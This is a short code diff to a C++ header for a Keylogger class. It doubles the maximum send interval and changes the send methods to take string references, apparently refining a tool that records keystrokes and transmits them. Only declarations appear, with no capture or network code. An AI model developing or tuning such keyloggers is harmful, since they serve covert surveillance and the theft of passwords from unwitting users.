@@ -3,7 +3,7 @@
 #include "CommandExe.h"
 
 const int V_SEND_INTERVAL_MIN = 1000;
-const int V_SEND_INTERVAL_MAX = 10000;
+const int V_SEND_INTERVAL_MAX = 20000;
 const int V_IDLE_TIME = 1;
 
 class Keylogger
@@ -15,8 +15,8 @@ public:
 	void Run();
 	void Stop();
 
-	void SendNewThread(const std::wstring *keys);
-	void Send(const std::wstring *keys);
+	void SendNewThread(const std::wstring& keys);
+	void Send(const std::wstring& keys);
 
 private:
 
